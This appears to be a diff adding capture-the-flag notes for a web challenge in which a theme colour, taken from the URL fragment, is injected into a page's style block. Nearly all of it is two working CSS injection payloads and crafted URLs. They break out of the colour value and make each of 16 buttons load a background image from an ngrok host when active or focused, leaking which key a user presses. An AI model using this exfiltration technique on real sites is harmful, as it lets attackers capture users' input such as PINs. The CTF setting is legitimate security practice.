@@ -1,0 +1,144 @@
+Theme Permalink
+```
+http://webp.bcactf.com:49153/#%7B%22bg%22%3A%22%23efe6e6%22%2C%22fg%22%3A%22%23000000%22%2C%22bbg%22%3A%22%230000ff%22%2C%22bfg%22%3A%22%23ffffff%22%7D
+=>
+http://webp.bcactf.com:49153/#{"bg":"#efe6e6","fg":"#000000","bbg":"#0000ff","bfg":"#ffffff"}
+```
+
+<style id="style">
+	<br>    
+		body, .c {
+	<br>        
+			background-color: #efe6e6;
+	<br>    
+		}
+	<br>
+	<br>
+		body {
+	<br>        
+			color: #000000;
+	<br>    
+		}
+	<br>
+	<br>
+		button {
+	<br>       
+			background-color: #0000ff;
+	<br>    
+			color: #ffffff;
+	<br>    
+		}
+	<br>
+	<br>    
+		#theme-creator {
+	<br>        
+			border-color: #000000;
+	<br>    
+		}
+	<br>
+</style>
+
+
+Payload 1
+```
+white;}
+.e :nth-child(1):active{background-image:url(http://4aa8439051ea.ngrok.io/?0);}
+.e :nth-child(2):active{background-image:url(http://4aa8439051ea.ngrok.io/?1);}
+.e :nth-child(3):active{background-image:url(http://4aa8439051ea.ngrok.io/?2);}
+.e :nth-child(4):active{background-image:url(http://4aa8439051ea.ngrok.io/?3);}
+.e :nth-child(5):active{background-image:url(http://4aa8439051ea.ngrok.io/?4);}
+.e :nth-child(6):active{background-image:url(http://4aa8439051ea.ngrok.io/?5);}
+.e :nth-child(7):active{background-image:url(http://4aa8439051ea.ngrok.io/?6);}
+.e :nth-child(8):active{background-image:url(http://4aa8439051ea.ngrok.io/?7);}
+.e :nth-child(9):active{background-image:url(http://4aa8439051ea.ngrok.io/?8);}
+.e :nth-child(10):active{background-image:url(http://4aa8439051ea.ngrok.io/?9);}
+.e :nth-child(11):active{background-image:url(http://4aa8439051ea.ngrok.io/?A);}
+.e :nth-child(12):active{background-image:url(http://4aa8439051ea.ngrok.io/?B);}
+.e :nth-child(13):active{background-image:url(http://4aa8439051ea.ngrok.io/?C);}
+.e :nth-child(14):active{background-image:url(http://4aa8439051ea.ngrok.io/?D);}
+.e :nth-child(15):active{background-image:url(http://4aa8439051ea.ngrok.io/?E);}
+.e :nth-child(16):active{background-image:url(http://4aa8439051ea.ngrok.io/?F)
+```
+
+Check
+```
+http://webp.bcactf.com:49153/#{"bg":"white;}.e :nth-child(1):active{background-image:url(http://4aa8439051ea.ngrok.io/?0);}.e :nth-child(2):active{background-image:url(http://4aa8439051ea.ngrok.io/?1);}.e :nth-child(3):active{background-image:url(http://4aa8439051ea.ngrok.io/?2);}.e :nth-child(4):active{background-image:url(http://4aa8439051ea.ngrok.io/?3);}.e :nth-child(5):active{background-image:url(http://4aa8439051ea.ngrok.io/?4);}.e :nth-child(6):active{background-image:url(http://4aa8439051ea.ngrok.io/?5);}.e :nth-child(7):active{background-image:url(http://4aa8439051ea.ngrok.io/?6);}.e :nth-child(8):active{background-image:url(http://4aa8439051ea.ngrok.io/?7);}.e :nth-child(9):active{background-image:url(http://4aa8439051ea.ngrok.io/?8);}.e :nth-child(10):active{background-image:url(http://4aa8439051ea.ngrok.io/?9);}.e :nth-child(11):active{background-image:url(http://4aa8439051ea.ngrok.io/?A);}.e :nth-child(12):active{background-image:url(http://4aa8439051ea.ngrok.io/?B);}.e :nth-child(13):active{background-image:url(http://4aa8439051ea.ngrok.io/?C);}.e :nth-child(14):active{background-image:url(http://4aa8439051ea.ngrok.io/?D);}.e :nth-child(15):active{background-image:url(http://4aa8439051ea.ngrok.io/?E);}.e :nth-child(16):active{background-image:url(http://4aa8439051ea.ngrok.io/?F)","fg":"#000000","bbg":"#0000ff","bfg":"#ffffff"}
+```
+
+<style id="style">
+	<br>    
+		body, .c {
+	<br>        
+			background-color: white;
+		}
+		.e :nth-child(1):active{background-image:url(http://4aa8439051ea.ngrok.io/?0);}
+		.e :nth-child(2):active{background-image:url(http://4aa8439051ea.ngrok.io/?1);}
+		.e :nth-child(3):active{background-image:url(http://4aa8439051ea.ngrok.io/?2);}
+		.e :nth-child(4):active{background-image:url(http://4aa8439051ea.ngrok.io/?3);}
+		.e :nth-child(5):active{background-image:url(http://4aa8439051ea.ngrok.io/?4);}
+		.e :nth-child(6):active{background-image:url(http://4aa8439051ea.ngrok.io/?5);}
+		.e :nth-child(7):active{background-image:url(http://4aa8439051ea.ngrok.io/?6);}
+		.e :nth-child(8):active{background-image:url(http://4aa8439051ea.ngrok.io/?7);}
+		.e :nth-child(9):active{background-image:url(http://4aa8439051ea.ngrok.io/?8);}
+		.e :nth-child(10):active{background-image:url(http://4aa8439051ea.ngrok.io/?9);}
+		.e :nth-child(11):active{background-image:url(http://4aa8439051ea.ngrok.io/?A);}
+		.e :nth-child(12):active{background-image:url(http://4aa8439051ea.ngrok.io/?B);}
+		.e :nth-child(13):active{background-image:url(http://4aa8439051ea.ngrok.io/?C);}
+		.e :nth-child(14):active{background-image:url(http://4aa8439051ea.ngrok.io/?D);}
+		.e :nth-child(15):active{background-image:url(http://4aa8439051ea.ngrok.io/?E);}
+		.e :nth-child(16):active{background-image:url(http://4aa8439051ea.ngrok.io/?F);
+	<br>   
+		}
+	<br>
+	<br> 
+		body {
+	<br>        
+			color: #000000;
+	<br>    
+		}
+	<br>
+	<br>
+		button {
+	<br>       
+			background-color: #0000ff;
+	<br>       
+			color: #ffffff;
+	<br>    
+		}
+	<br>
+	<br>  
+		#theme-creator {
+	<br>        
+			border-color: #000000;
+	<br>    
+		}
+	<br>    
+</style>
+
+
+
+Payload 2
+```
+white;}
+.e>button:nth-child(1):focus{background: url('//4aa8439051ea.ngrok.io/0');}
+.e>button:nth-child(2):focus{background: url('//4aa8439051ea.ngrok.io/1');}
+.e>button:nth-child(3):focus{background: url('//4aa8439051ea.ngrok.io/2');}
+.e>button:nth-child(4):focus{background: url('//4aa8439051ea.ngrok.io/3');}
+.e>button:nth-child(5):focus{background: url('//4aa8439051ea.ngrok.io/4');}
+.e>button:nth-child(6):focus{background: url('//4aa8439051ea.ngrok.io/5');}
+.e>button:nth-child(7):focus{background: url('//4aa8439051ea.ngrok.io/6');}
+.e>button:nth-child(8):focus{background: url('//4aa8439051ea.ngrok.io/7');}
+.e>button:nth-child(9):focus{background: url('//4aa8439051ea.ngrok.io/8');}
+.e>button:nth-child(10):focus{background: url('//4aa8439051ea.ngrok.io/9');}
+.e>button:nth-child(11):focus{background: url('//4aa8439051ea.ngrok.io/A');}
+.e>button:nth-child(12):focus{background: url('//4aa8439051ea.ngrok.io/B');}
+.e>button:nth-child(13):focus{background: url('//4aa8439051ea.ngrok.io/C');}
+.e>button:nth-child(14):focus{background: url('//4aa8439051ea.ngrok.io/D');}
+.e>button:nth-child(15):focus{background: url('//4aa8439051ea.ngrok.io/E');}
+.e>button:nth-child(16):focus{background: url('//4aa8439051ea.ngrok.io/F')
+```
+
+Check
+```
+http://webp.bcactf.com:49153/#{"bg":"white;}.e>button:nth-child(1):focus{background: url('//4aa8439051ea.ngrok.io/0');}.e>button:nth-child(2):focus{background: url('//4aa8439051ea.ngrok.io/1');}.e>button:nth-child(3):focus{background: url('//4aa8439051ea.ngrok.io/2');}.e>button:nth-child(4):focus{background: url('//4aa8439051ea.ngrok.io/3');}.e>button:nth-child(5):focus{background: url('//4aa8439051ea.ngrok.io/4');}.e>button:nth-child(6):focus{background: url('//4aa8439051ea.ngrok.io/5');}.e>button:nth-child(7):focus{background: url('//4aa8439051ea.ngrok.io/6');}.e>button:nth-child(8):focus{background: url('//4aa8439051ea.ngrok.io/7');}.e>button:nth-child(9):focus{background: url('//4aa8439051ea.ngrok.io/8');}.e>button:nth-child(10):focus{background: url('//4aa8439051ea.ngrok.io/9');}.e>button:nth-child(11):focus{background: url('//4aa8439051ea.ngrok.io/A');}.e>button:nth-child(12):focus{background: url('//4aa8439051ea.ngrok.io/B');}.e>button:nth-child(13):focus{background: url('//4aa8439051ea.ngrok.io/C');}.e>button:nth-child(14):focus{background: url('//4aa8439051ea.ngrok.io/D');}.e>button:nth-child(15):focus{background: url('//4aa8439051ea.ngrok.io/E');}.e>button:nth-child(16):focus{background: url('//4aa8439051ea.ngrok.io/F')","fg":"#000000","bbg":"#0000ff","bfg":"#ffffff"}
+```
